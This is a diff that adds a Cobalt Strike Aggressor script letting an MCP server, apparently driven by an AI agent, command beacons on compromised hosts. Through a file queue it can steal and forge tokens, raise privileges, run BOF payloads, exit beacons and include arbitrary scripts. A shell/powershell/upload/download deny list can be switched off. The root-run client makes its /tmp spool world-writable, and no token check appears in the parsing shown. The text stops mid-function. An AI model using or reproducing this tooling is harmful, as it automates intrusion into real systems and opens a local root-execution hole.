@@ -1,0 +1,1378 @@
+# =====================================================================
+#  cs_agent.cna  --  Cobalt Strike 4.9 side agent for the cs-mcp-4.9 server
+# ---------------------------------------------------------------------
+#  Runs INSIDE the Cobalt Strike client (Aggressor/Sleep) and is the
+#  only component allowed to touch the Aggressor API.  MCP, JSON, risk
+#  policy and the BOF registry all live in Python.
+#
+#  CS 4.9 / SLEEP LANDMINES (every one of these bit this build; they
+#  are all handled explicitly below)
+#
+#    * "x" == $null is TRUE for any NON-NUMERIC string.  Sleep coerces
+#      the string to 0 and 0 == null.  So a null check on a string
+#      value silently returns "it is null".  Use "eq $null" instead.
+#    * "x" != $null is FALSE for the same reason - a numeric guard
+#      rejects every real payload.
+#    * indexOf() returns an EMPTY scalar on a miss, never -1.  An empty
+#      scalar equals 0 numerically, so "indexOf($s,$x) == 0" is true
+#      for a miss as well as for a match at position 0.  Use
+#      starts_with() or test the length of the result.
+#    * a forked thread does NOT inherit script globals.  Every global
+#      reads back empty in the pump thread, which silently breaks
+#      paths, versions and sleep intervals.  Use functions.
+#    * fork() is a SLEEP built in (sleep/bridges/BasicIO$fork).
+#      Defining "sub fork" shadows it and the thread never runs.
+#    * readb($fh) with no length argument returns ONE byte, not the
+#      file, and readb($fh, -1) returns the whole file as a string
+#      with each byte mapped to char 0-255 (binary safe).
+#    * writeb() is byte preserving for char codes 0-255.
+#    * chr() works; there is NO "char" class ("[new char: 1]" is a
+#      load time error).
+#    * openf() mode strings must not contain a space ("openf(\"> \" . $p)"
+#      silently opens the wrong thing).
+#    * a Sleep hash literal keeps the quotes on string keys:
+#      %("token" => x) iterates with the key "token" INCLUDING quotes.
+#    * Sleep has no /* */ comments, only #.
+#    * java.net constructors return $null (no sockets).
+#    * no JSON parser -> dumb line protocol instead.
+#    * '$','%','@' inside a double quoted literal derails the lexer.
+#
+#  So this agent never assumes a Sleep primitive behaves as documented:
+#  every file read VALIDATES its result against the real file length
+#  reported by java.io.File, and falls back to another strategy when it
+#  does not match.  The strategy that worked is logged.
+#
+#  TRANSPORT (all paths under $AGENT_DIR, default /tmp/cs-mcp-4.9)
+#    inbox/queue.txt      append-only list of request ids
+#    inbox/<id>.req       request body
+#    inbox/<id>.claim     atomic claim (two pumps never double-run)
+#    outbox/<id>.res      response
+#    output.log           captured beacon output
+#    agent.status         append-only key/value status
+#    agent.heartbeat      overwritten on every pump pass
+#    agent.log            diagnostics
+#    agent.token          shared secret
+#
+#  WIRE FORMAT (tab separated, values escaped as \t \n \r \\)
+#    request   TOOL<TAB>name
+#              ARG<TAB>key<TAB>value
+#              END
+#    response  STATUS<TAB>ok|error
+#              MSG<TAB>message
+#              DATA<TAB>key<TAB>value
+#              ROW<TAB>field<TAB>field...
+#              END
+#
+#  CONSOLE COMMANDS
+#    csagent status | start | stop | selftest | probe
+#
+#  Authorized engagements only.  Adds no evasion capability: it
+#  automates the licensed operator console you already drive.
+# =====================================================================
+
+#  CONFIG
+#  These are FUNCTIONS, not globals.  A forked thread does NOT inherit
+#  the parent script's globals - every one of them reads back empty in
+#  the pump thread, which would send the pump to the wrong spool
+#  directory and make it spin with a zero length sleep.
+
+sub agent_version { return "4.9"; }
+sub agent_dir_default { return "/tmp/cs-mcp-4.9"; }
+sub pump_interval { return 150; }
+
+# ------------------------------ config --------------------------------
+
+sub agent_dir {
+    $d = "";
+    try { $d = "" . [java.lang.System getProperty: "cs.mcp.dir"]; } catch $e { }
+    if ($d eq $null || $d eq "" || $d eq "null") { $d = agent_dir_default(); }
+    return $d;
+}
+
+sub agent_token {
+    $t = "";
+    try { $t = "" . [java.lang.System getProperty: "cs.mcp.token"]; } catch $e { }
+    if ($t eq $null || $t eq "" || $t eq "null") {
+        $t = trim(read_text(agent_dir() . "/agent.token"));
+    }
+    if ($t eq $null || $t eq "") {
+        $t = gen_token();
+        write_text(agent_dir() . "/agent.token", $t);
+    }
+    return $t;
+}
+
+sub gen_token {
+    $t = "";
+    try {
+        $u1 = [java.util.UUID randomUUID];
+        $t = "" . [$u1 toString];
+    } catch $e { }
+    if ($t eq $null || strlen($t) < 8) {
+        $t = "" . rand(999999999) . "-" . rand(999999999) . "-" . rand(99999999);
+    }
+    return $t;
+}
+
+# --------------------------- tiny primitives --------------------------
+
+sub now_ms {
+    $t = "";
+    # wall clock first: useful for correlating with the Team Server log
+    try { $t = "" . [java.lang.System currentTimeMillis]; } catch $e { }
+    if ($t eq $null || $t eq "" || $t eq "null") {
+        try { $t = "" . ticks(); } catch $e2 { }
+    }
+    if ($t eq $null || $t eq "" || $t eq "null") { $t = "" . rand(999999999); }
+    return $t;
+}
+
+sub sleep_ms {
+    ($ms) = @_;
+    $ok = 0;
+    try { [java.lang.Thread sleep: $ms]; $ok = 1; } catch $e { }
+    if ($ok == 0) {
+        $spin = 0;
+        while ($spin < $ms) { $spin = $spin + 10; }
+    }
+}
+
+sub trim {
+    # Sleep variables are dynamically scoped: without local(), the $n and
+    # $b below overwrite a caller's loop variable (this silently turned
+    # a beacon id into 9 and a task counter into 10 in the task router).
+    local('$s0 $s $n $a $b $c');
+    ($s0) = @_;
+    if ($s0 eq $null) { return ""; }
+    $s = "" . $s0;
+    $n = strlen($s);
+    $a = 0;
+    $b = $n;
+    while ($a < $b) {
+        $c = substr($s, $a, $a + 1);
+        if ($c eq " " || $c eq "\t" || $c eq "\n" || $c eq "\r") { $a = $a + 1; }
+        else { break; }
+    }
+    while ($b > $a) {
+        $c = substr($s, $b - 1, $b);
+        if ($c eq " " || $c eq "\t" || $c eq "\n" || $c eq "\r") { $b = $b - 1; }
+        else { break; }
+    }
+    if ($b <= $a) { return ""; }
+    return substr($s, $a, $b);
+}
+
+# int -> one character.
+# Verified against sleep/bridges/BasicStrings$func_chr in the CS 4.9 jar:
+#   StringBuffer.append((char) n)  ->  chr() is correct and reliable here.
+# There is NO "char" class in Sleep ("[new char: 1]" is a load-time error),
+# so the Java fallback uses java.lang.Character.toString(int) which takes a
+# code point and returns the matching character.
+sub byte_char {
+    ($n) = @_;
+    $i = $n + 0;
+    if ($i < 0) { $i = 0; }
+    if ($i > 255) { $i = 255; }
+    $s = "";
+    try { $s = "" . chr($i); } catch $e { }
+    if ($s eq $null || $s eq "" || $s eq "null") {
+        try { $s = "" . [java.lang.Character toString: ($i + 0)]; } catch $e2 { }
+    }
+    return $s;
+}
+
+# escape/unescape for the tab separated wire format (manual, no regex)
+sub esc {
+    ($s0) = @_;
+    if ($s0 eq $null) { return ""; }
+    $s = "" . $s0;
+    $out = "";
+    $n = strlen($s);
+    for ($i = 0; $i < $n; $i = $i + 1) {
+        $c = substr($s, $i, $i + 1);
+        if ($c eq "\t") { $out = $out . "\\t"; }
+        else if ($c eq "\n") { $out = $out . "\\n"; }
+        else if ($c eq "\r") { $out = $out . "\\r"; }
+        else if ($c eq "\\") { $out = $out . "\\\\"; }
+        else { $out = $out . $c; }
+    }
+    return $out;
+}
+
+sub unesc {
+    ($s0) = @_;
+    if ($s0 eq $null) { return ""; }
+    $s = "" . $s0;
+    $out = "";
+    $n = strlen($s);
+    for ($i = 0; $i < $n; $i = $i + 1) {
+        $c = substr($s, $i, $i + 1);
+        if ($c eq "\\") {
+            if ($i + 1 < $n) {
+                $nxt = substr($s, $i + 1, $i + 2);
+                if ($nxt eq "t") { $out = $out . "\t"; $i = $i + 1; continue; }
+                if ($nxt eq "n") { $out = $out . "\n"; $i = $i + 1; continue; }
+                if ($nxt eq "r") { $out = $out . "\r"; $i = $i + 1; continue; }
+                if ($nxt eq "\\") { $out = $out . "\\"; $i = $i + 1; continue; }
+                $out = $out . $nxt;
+                $i = $i + 1;
+                continue;
+            }
+            $out = $out . $c;
+            continue;
+        }
+        $out = $out . $c;
+    }
+    return $out;
+}
+
+# ------------------------------ file i/o ------------------------------
+
+sub file_len {
+    ($p) = @_;
+    $n = -1;
+    try {
+        $f = [new java.io.File: $p];
+        $n = "" . [$f length];
+        $n = $n + 0;
+    } catch $e { }
+    return $n;
+}
+
+sub file_exists {
+    ($p) = @_;
+    $ok = 0;
+    try {
+        $f = [new java.io.File: $p];
+        if ([$f exists]) { $ok = 1; }
+    } catch $e { }
+    return $ok;
+}
+
+sub write_text {
+    ($p, $t) = @_;
+    try {
+        $fh = openf(">" . $p);
+        writeb($fh, $t);
+        closef($fh);
+        return 1;
+    } catch $e { }
+    return 0;
+}
+
+sub append_text {
+    ($p, $t) = @_;
+    $ok = 0;
+    try {
+        $fh = openf(">>" . $p);
+        writeb($fh, $t);
+        closef($fh);
+        $ok = 1;
+    } catch $e { }
+    if ($ok == 0) {
+        $old = read_text($p);
+        write_text($p, $old . $t);
+    }
+    return $ok;
+}
+
+sub read_strategy {
+    global('$READ_STRATEGY');
+    if ($READ_STRATEGY eq $null) { return "unknown"; }
+    return $READ_STRATEGY;
+}
+
+#  READ
+#  Verified against sleep/bridges/BasicIO$readb in the CS 4.9 jar:
+#    readb($fh, -1)  reads the WHOLE file, byte by byte, and returns it
+#                    as a string with each byte mapped to char 0-255.
+#                    This is exactly what every BOF kit in the corpus
+#                    uses to load a .o file, so it is binary safe.
+#    readb($fh)      (no length) returns an EMPTY scalar - it does NOT
+#                    read a single byte.  Never use it.
+#  The result is validated against the real length reported by
+#  java.io.File before it is trusted, and the strategy that worked is
+#  recorded so the MCP can report it.
+sub read_text {
+    ($p) = @_;
+    global('$READ_STRATEGY');
+    $len = file_len($p);
+    if ($len < 0) { return ""; }
+    if ($len == 0) { return ""; }
+
+    # PRIMARY: readb($fh, -1) -> whole file.
+    # The length is the only validity test.  Do NOT add a "!= $null"
+    # guard here: Sleep compares numerically, a non numeric string
+    # coerces to 0, and 0 != $null is FALSE - so the guard silently
+    # rejects every real payload.
+    try {
+        $fh = openf($p);
+        $data = readb($fh, -1);
+        closef($fh);
+        $got = strlen("" . $data);
+        if ($got == $len) {
+            $READ_STRATEGY = "readb_len";
+            return "" . $data;
+        }
+    } catch $e { }
+
+    # FALLBACK 1: one byte at a time via readb($fh, 1)
+    try {
+        $fh = openf($p);
+        $out = "";
+        $k = 0;
+        while ($k < $len) {
+            $b = "";
+            try { $b = readb($fh, 1); } catch $re { }
+            if ($b eq $null || strlen("" . $b) == 0) { break; }
+            $out = $out . "" . $b;
+            $k = $k + 1;
+        }
+        closef($fh);
+        if (strlen($out) == $len) {
+            $READ_STRATEGY = "readb_chunk1";
+            return $out;
+        }
+    } catch $e2 { }
+
+    # FALLBACK 2: line based (text only, not binary safe)
+    try {
+        $fh = openf($p);
+        $out = "";
+        while (1) {
+            $line = readln($fh);
+            if ($line eq $null) { break; }
+            $out = $out . $line . "\n";
+        }
+        closef($fh);
+        $READ_STRATEGY = "readln";
+        return $out;
+    } catch $e3 { }
+
+    $READ_STRATEGY = "failed";
+    return "";
+}
+
+#  FILE PERMISSIONS
+#  The Cobalt Strike client runs as ROOT while the MCP server runs as
+#  an unprivileged user.  Every file the two sides share therefore has
+#  to be readable and writable by BOTH.
+#
+#  java.io.File.setWritable(writable, ownerOnly) with ownerOnly = false
+#  applies the mode to EVERYONE, which is what is needed here.
+#  setPermission() does not exist on java.io.File in this build.
+sub relax_perms {
+    ($p, $isdir) = @_;
+    try {
+        $f = [new java.io.File: $p];
+        [$f setReadable: 1, 0];
+        [$f setWritable: 1, 0];
+        if ($isdir == 1) { [$f setExecutable: 1, 0]; }
+    } catch $e { }
+}
+
+sub ensure_dirs {
+    $d = agent_dir();
+    try {
+        $f0 = [new java.io.File: $d];
+        [$f0 mkdirs];
+        $f1 = [new java.io.File: $d . "/inbox"];
+        [$f1 mkdirs];
+        $f2 = [new java.io.File: $d . "/outbox"];
+        [$f2 mkdirs];
+    } catch $e { }
+
+    # If the client created these as root before the installer ran, the
+    # MCP server could not write request files into them.  Open them up.
+    relax_perms($d, 1);
+    relax_perms($d . "/inbox", 1);
+    relax_perms($d . "/outbox", 1);
+
+    # The queue file is shared between the two processes.  Create it HERE
+    # (before anything appends to it) with world writable permissions, so
+    # that the later append keeps the permissive mode.
+    $q = $d . "/inbox/queue.txt";
+    if (file_exists($q) == 0) {
+        write_text($q, "");
+    }
+    relax_perms($q, 0);
+}
+
+# atomic claim: createNewFile is atomic on POSIX
+sub claim_file {
+    ($p) = @_;
+    $won = 0;
+    try {
+        $f = [new java.io.File: $p];
+        if ([$f createNewFile]) { $won = 1; }
+    } catch $e { }
+    return $won;
+}
+
+# ------------------------------- logging ------------------------------
+#  Status is append-only: one "DATA<TAB>key<TAB>value" line per fact.
+#  The reader keeps the last value seen for a key.  Append-only means
+#  no shared buffer and no hash iteration, so the forked pump thread
+#  and the main script never fight over one file.
+
+sub log_msg {
+    ($m) = @_;
+    append_text(agent_dir() . "/agent.log", "[" . now_ms() . "] " . $m . "\n");
+}
+
+sub set_status {
+    ($k, $v) = @_;
+    append_text(agent_dir() . "/agent.status",
+        "DATA\t" . $k . "\t" . esc("" . $v) . "\n");
+}
+
+sub heartbeat {
+    ($mode) = @_;
+    write_text(agent_dir() . "/agent.heartbeat",
+        "DATA\tmode\t" . esc($mode) . "\n" .
+        "DATA\ttime\t" . esc(now_ms()) . "\n" .
+        "DATA\tagent_version\t" . esc(agent_version()) . "\n");
+}
+
+# --------------------------- response builder --------------------------
+
+sub resp_start {
+    global('$RESP');
+    $RESP = "STATUS\tok\n";
+}
+
+sub resp_msg {
+    ($m) = @_;
+    global('$RESP');
+    $RESP = $RESP . "MSG\t" . esc($m) . "\n";
+}
+
+sub resp_data {
+    ($k, $v) = @_;
+    global('$RESP');
+    $RESP = $RESP . "DATA\t" . $k . "\t" . esc("" . $v) . "\n";
+}
+
+sub resp_row {
+    #  SLEEP LANDMINE: "(@f) = @_;" does NOT capture every argument.
+    #  It takes only the FIRST one and leaves it as a scalar, so a row
+    #  with three columns comes back with one empty column.  The
+    #  correct form is "@f = @_;"  (no parentheses).
+    @f = @_;
+
+    #  A single ARRAY argument is flattened into several fields, so a
+    #  helper that returns an array can be passed straight through.
+    if (size(@f) == 1) {
+        $only = @f[0];
+        $cls = "";
+        try { $cls = "" . [$only getClass]; } catch $e { }
+        if (strlen("" . indexOf($cls, "ListContainer")) > 0) { @f = $only; }
+    }
+
+    global('$RESP');
+    $line = "ROW\t";
+    foreach $x (@f) {
+        $line = $line . esc("" . $x) . "\t";
+    }
+    $RESP = $RESP . $line . "\n";
+}
+
+sub resp_error {
+    ($m) = @_;
+    global('$RESP');
+    $RESP = "STATUS\terror\n";
+    $RESP = $RESP . "MSG\t" . esc($m) . "\n";
+}
+
+sub resp_end {
+    global('$RESP');
+    $RESP = $RESP . "END\n";
+    return $RESP;
+}
+
+#  SLEEP LANDMINE: indexOf() returns an EMPTY scalar when the needle is
+#  not found, it does NOT return -1.  An empty scalar compares equal to
+#  0, so "indexOf($s, $x) == 0" is true for a MISS as well as for a
+#  match at position 0.  Always use starts_with() instead.
+sub starts_with {
+    ($s, $prefix) = @_;
+    if ($s eq $null) { return 0; }
+    $n = strlen($prefix);
+    if ($n == 0) { return 1; }
+    if (strlen($s) < $n) { return 0; }
+    if (substr($s, 0, $n) eq $prefix) { return 1; }
+    return 0;
+}
+
+# --------------------------- request parsing ---------------------------
+
+sub parse_request {
+    ($path) = @_;
+    %a = %();
+    $tool = "";
+    $lines = split("\n", read_text($path));
+    foreach $ln ($lines) {
+        if (starts_with($ln, "TOOL\t") == 1) {
+            $tool = substr($ln, 5, strlen($ln));
+        }
+        else if (starts_with($ln, "ARG\t") == 1) {
+            $rest = substr($ln, 4, strlen($ln));
+            $parts = split("\t", $rest);
+            if (size($parts) >= 2) {
+                %a[$parts[0]] = unesc($parts[1]);
+            }
+        }
+    }
+    return @($tool, %a);
+}
+
+sub arg_of {
+    (%a, $k, $dflt) = @_;
+    if (%a[$k] eq $null) { return $dflt; }
+    return %a[$k];
+}
+
+# --------------------------- beacon helpers -----------------------------
+
+sub resolve_bids {
+    (%a) = @_;
+    @out = @();
+    $bid = %a["bid"];
+    if ($bid eq $null || $bid eq "") { return @out; }
+    if ($bid eq "all") {
+        foreach $b (beacons()) { push(@out, "" . $b); }
+        return @out;
+    }
+    push(@out, "" . $bid);
+    return @out;
+}
+
+sub beacon_row {
+    ($bid) = @_;
+    @r = @($bid);
+    foreach $k (@("note", "internal", "external", "computer", "user", "os",
+                  "arch", "pid", "process", "last", "sleep", "is_admin")) {
+        $v = "";
+        try { $v = "" . beacon_info($bid, $k); } catch $e { $v = ""; }
+        push(@r, $v);
+    }
+    return @r;
+}
+
+# --------------------------- hard deny list -----------------------------
+
+sub denied_raw {
+    ($cmd) = @_;
+    $c = lc(trim($cmd));
+    if ($c eq "") { return 0; }
+    # indexOf returns an empty scalar on a miss (never -1), so test the
+    # length of the result rather than comparing against -1.
+    $sp = indexOf($c, " ");
+    $first = $c;
+    if (strlen("" . $sp) > 0) { $first = substr($c, 0, $sp); }
+    $first = trim($first);
+    foreach $d (@("shell", "powershell", "execute-assembly", "upload",
+                  "download", "screenshot", "portscan", "kill", "rm",
+                  "runas", "getuid", "inline-execute")) {
+        if ($first eq $d) { return 1; }
+    }
+    return 0;
+}
+
+sub allow_denied {
+    $v = "";
+    try { $v = "" . [java.lang.System getProperty: "cs.mcp.allow_denied"]; } catch $e { }
+    if ($v eq "1" || $v eq "true") { return 1; }
+    return 0;
+}
+
+# --------------------------- command routing -----------------------------
+#  A Beacon command is NOT a program name.  bexecute() is command id 12
+#  (CC_EXECUTE) and makes the target spawn a process - that is only right
+#  for the shell/run family.  Sending "blockdlls" through it produced
+#  "could not spawn blockdlls: 2 - ERROR_FILE_NOT_FOUND" on the host.
+#
+#  The real Beacon console dispatches in this order:
+#    1. client-side alias from a custom .cna kit -> AliasManager.fireCommand
+#    2. built-in Beacon command -> the matching b<command> bridge function
+#  The old generic task handler skipped both and called bexecute() for
+#  everything, so built-ins and plugin commands were both broken.
+
+# Thin wrappers around the live client's AliasManager.  Keeping them in
+# functions makes the whole routing path stubbable by tools/dryrun.py,
+# which runs the agent without a Cobalt Strike client.
+sub is_plugin_alias {
+    local('$name $client $am');
+    ($name) = @_;
+    $client = getAggressorClient();
+    $am = [$client getAliases];
+    return [$am isAlias: $name];
+}
+
+sub fire_plugin_alias {
+    local('$bid $verb $args $client $am');
+    ($bid, $verb, $args) = @_;
+    $client = getAggressorClient();
+    $am = [$client getAliases];
+    # AliasManager.fireCommand is (bid, command, args) - the console passes
+    # the session id first.  Getting this wrong silently fires nothing.
+    return [$am fireCommand: $bid, $verb, $args];
+}
+
+sub cmd_verb {
+    local('$cmd $p');
+    ($cmd) = @_;
+    $p = split('\s+', trim("" . $cmd), 2);
+    if (size($p) == 0) { return ""; }
+    return "" . $p[0];
+}
+
+sub cmd_args {
+    local('$cmd $p');
+    ($cmd) = @_;
+    $p = split('\s+', trim("" . $cmd), 2);
+    if (size($p) < 2) { return ""; }
+    return "" . $p[1];
+}
+
+# In-process / low-noise built-ins that have a real Aggressor bridge.
+# Anything not listed here is either a plugin alias (handled by
+# AliasManager above) or refused explicitly - never bexecute()'d.
+sub builtin_task {
+    local('$b $verb $args $v $a $p $on $low $sec $jit $domain $user $pass $slash');
+    ($b, $verb, $args) = @_;
+    $v = lc(trim($verb));
+    $a = trim($args);
+
+    if ($v eq "blockdlls") {
+        $on = 1;
+        $low = lc($a);
+        if ($low eq "stop" || $low eq "off" || $low eq "0" || $low eq "false") { $on = 0; }
+        bblockdlls($b, $on);
+        return 1;
+    }
+    if ($v eq "jobs")     { bjobs($b); return 1; }
+    if ($v eq "pwd")      { bpwd($b); return 1; }
+    if ($v eq "rev2self") { brev2self($b); return 1; }
+    if ($v eq "note")     { bnote($b, $a); return 1; }
+    if ($v eq "sleep") {
+        $p = split('\s+', $a);
+        $sec = "60"; $jit = "0";
+        if (size($p) > 0) { $sec = "" . $p[0]; }
+        if (size($p) > 1) { $jit = "" . $p[1]; }
+        bsleep($b, $sec, $jit);
+        return 1;
+    }
+    if ($v eq "cd") { bcd($b, $a); return 1; }
+    if ($v eq "getprivs") {
+        if ($a eq "") { bgetprivs($b); } else { bgetprivs($b, $a); }
+        return 1;
+    }
+    if ($v eq "steal_token") {
+        $p = split('\s+', $a);
+        if (size($p) > 0) { bsteal_token($b, "" . $p[0]); return 1; }
+        return 0;
+    }
+    # make_token <user> <password> is TaskBeacon.LoginUser(domain, user, pw)
+    if ($v eq "make_token") {
+        $p = split('\s+', $a, 2);
+        if (size($p) < 2) { return 0; }
+        $user = "" . $p[0];
+        $pass = "" . $p[1];
+        $domain = ".";
+        $slash = indexOf($user, chr(92));
+        if (strlen("" . $slash) > 0) {
+            $domain = substr($user, 0, $slash);
+            $user = substr($user, $slash + 1, strlen($user));
+        }
+        bloginuser($b, $domain, $user, $pass);
+        return 1;
+    }
+    # Denied by policy by default, but an operator can explicitly allow
+    # them; when they are allowed they must still take the proper bridge.
+    if ($v eq "shell") { bshell($b, $a); return 1; }
+    if ($v eq "run")   { brun($b, $a); return 1; }
+    return 0;
+}
+
+# ------------------------------- dispatch -------------------------------
+
+sub dispatch {
+    ($tool, %a) = @_;
+
+    if ($tool eq "") { resp_error("empty tool name"); return resp_end(); }
+
+    if ($tool eq "ping") {
+        resp_start();
+        resp_data("agent_version", agent_version());
+        resp_data("dir", agent_dir());
+        resp_data("time", now_ms());
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "status") {
+        resp_start();
+        $nb = 0;
+        foreach $b (beacons()) { $nb = $nb + 1; }
+        $nl = 0;
+        $lerr = "";
+        try { foreach $l (listeners()) { $nl = $nl + 1; } } catch $e { $lerr = "" . $e; }
+        resp_data("agent_version", agent_version());
+        resp_data("beacons", "" . $nb);
+        resp_data("listeners", "" . $nl);
+        resp_data("mode", mode());
+        resp_data("time", now_ms());
+        if ($lerr ne "") { resp_data("listeners_error", $lerr); }
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "beacons") {
+        resp_start();
+        $n = 0;
+        foreach $b (beacons()) {
+            resp_row(beacon_row("" . $b));
+            $n = $n + 1;
+        }
+        resp_data("count", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "beacon_info") {
+        $bid = arg_of(%a, "bid", "");
+        if ($bid eq "") { resp_error("bid required"); return resp_end(); }
+        resp_start();
+        @row = beacon_row($bid);
+        $keys = @("id", "note", "internal", "external", "computer", "user",
+                  "os", "arch", "pid", "process", "last", "sleep", "is_admin");
+        for ($i = 0; $i < size($keys); $i = $i + 1) {
+            resp_data($keys[$i], $row[$i]);
+        }
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "hosts") {
+        resp_start();
+        $n = 0;
+        foreach $h (hosts()) {
+            $addr = "";
+            $os = "";
+            try { $addr = "" . host_info($h, "address"); } catch $e { }
+            try { $os = "" . host_info($h, "os"); } catch $e { }
+            resp_row("" . $h, $addr, $os);
+            $n = $n + 1;
+        }
+        resp_data("count", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "listeners") {
+        resp_start();
+        $n = 0;
+        foreach $name (listeners()) {
+            $row = @("" . $name);
+            %li = %();
+            try { %li = listener_info($name); } catch $e { }
+            foreach $k => $v (%li) { push(@row, "" . $k . "=" . "" . $v); }
+            resp_row(@row);
+            $n = $n + 1;
+        }
+        resp_data("count", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "plugin_commands") {
+        resp_start();
+        $n = 0;
+        @cmds = @();
+        try { @cmds = beacon_commands(); } catch $e { }
+        foreach $c (@cmds) {
+            $name = "" . $c;
+            $desc = "";
+            $detail = "";
+            try { $desc = "" . beacon_command_describe($name); } catch $e { }
+            try { $detail = "" . beacon_command_detail($name); } catch $e { }
+            resp_row($name, $desc, $detail);
+            $n = $n + 1;
+        }
+        resp_data("count", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "task") {
+        $cmd = arg_of(%a, "cmd", "");
+        if (trim($cmd) eq "") { resp_error("cmd required"); return resp_end(); }
+        if (denied_raw($cmd) == 1 && allow_denied() == 0) {
+            resp_error("command blocked by agent hard-deny policy: " . $cmd);
+            return resp_end();
+        }
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+
+        $verb = cmd_verb($cmd);
+        $args = cmd_args($cmd);
+
+        $n = 0;
+        $path = "";
+        $bad = "";
+        foreach $b (@bids) {
+            if (is_plugin_alias($verb) == 1) {
+                # custom .cna plugin command - exactly what the console does
+                fire_plugin_alias($b, $verb, $args);
+                $path = "plugin-alias";
+                $n = $n + 1;
+            }
+            else if (builtin_task($b, $verb, $args) == 1) {
+                $path = "builtin-bridge";
+                $n = $n + 1;
+            }
+            else {
+                $bad = $verb;
+            }
+        }
+        if ($bad ne "") {
+            resp_error("unsupported command '" . $bad . "': not a plugin alias and no built-in bridge");
+            return resp_end();
+        }
+        resp_start();
+        resp_data("tasked", "" . $n);
+        resp_data("path", $path);
+        resp_data("note", "queued; output appears in the CS beacon console");
+        resp_end();
+        return $RESP;
+    }
+
+    # custom BOF execution - the primary control path
+    if ($tool eq "inline_execute") {
+        $bid = arg_of(%a, "bid", "");
+        $path = arg_of(%a, "path", "");
+        $entry = arg_of(%a, "entry", "go");
+        if ($bid eq "") { resp_error("bid required"); return resp_end(); }
+        if ($path eq "") { resp_error("path required"); return resp_end(); }
+        if (file_exists($path) == 0) {
+            resp_error("BOF object not found on the CS client machine: " . $path);
+            return resp_end();
+        }
+        $data = read_text($path);
+        if ($data eq $null || strlen($data) == 0) {
+            resp_error("BOF object is empty or unreadable: " . $path);
+            return resp_end();
+        }
+        $argval = arg_of(%a, "arg", "");
+        $fmt = arg_of(%a, "fmt", "");
+        $val2 = arg_of(%a, "value", "");
+        $hasargs = 0;
+        if ($argval ne "") { $hasargs = 1; }
+        if ($fmt ne "" && $val2 ne "") { $hasargs = 1; }
+        try {
+            # Always call with FOUR arguments.  Every kit in the corpus
+            # does beacon_inline_execute($bid, $data, "go", $args) and
+            # passes $null when there are no arguments, because Cobalt
+            # Strike expects the argument slot to be present.
+            if ($hasargs == 1) {
+                if ($argval ne "") { $packed = bof_pack($bid, "z", $argval); }
+                else { $packed = bof_pack($bid, $fmt, $val2); }
+            }
+            else {
+                $packed = $null;
+            }
+            beacon_inline_execute($bid, $data, $entry, $packed);
+            resp_start();
+            resp_data("tasked", "1");
+            resp_data("bof", $path);
+            resp_data("entry", $entry);
+            resp_data("bytes", "" . strlen($data));
+            resp_data("note", "queued; output appears in the CS beacon console");
+            resp_end();
+            return $RESP;
+        } catch $e {
+            resp_error("beacon_inline_execute failed: " . $e);
+            return resp_end();
+        }
+    }
+
+    if ($tool eq "note") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        $t = arg_of(%a, "note", "");
+        $n = 0;
+        foreach $b (@bids) { bnote($b, $t); $n = $n + 1; }
+        resp_start();
+        resp_data("noted", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "set_sleep") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        $s = arg_of(%a, "sleep", "60");
+        $j = arg_of(%a, "jitter", "0");
+        $n = 0;
+        foreach $b (@bids) { bsleep($b, $s, $j); $n = $n + 1; }
+        resp_start();
+        resp_data("sleep_set", "" . $n);
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "ps") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        foreach $b (@bids) { bps($b); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "jobs") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        foreach $b (@bids) { bjobs($b); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "steal_token") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        $pid = arg_of(%a, "pid", "");
+        foreach $b (@bids) { bsteal_token($b, $pid); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "make_token") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        $u = arg_of(%a, "user", "");
+        $p = arg_of(%a, "password", "");
+        foreach $b (@bids) { bmake_token($b, $u, $p); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "rev2self") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        foreach $b (@bids) { brev2self($b); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "getprivs") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        $p = arg_of(%a, "privs", "SeDebugPrivilege");
+        foreach $b (@bids) { bgetprivs($b, $p); }
+        resp_start();
+        resp_data("queued", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "exit") {
+        @bids = resolve_bids(%a);
+        if (size(@bids) == 0) { resp_error("bid required"); return resp_end(); }
+        foreach $b (@bids) { bexit($b); }
+        resp_start();
+        resp_data("exited", "" . size(@bids));
+        resp_end();
+        return $RESP;
+    }
+
+    if ($tool eq "load_script") {
+        $path = arg_of(%a, "path", "");
+        if ($path eq "") { resp_error("path required"); return resp_end(); }
+        try {
+            include($path);
+            resp_start();
+            resp_data("loaded", $path);
+            resp_end();
+            return $RESP;
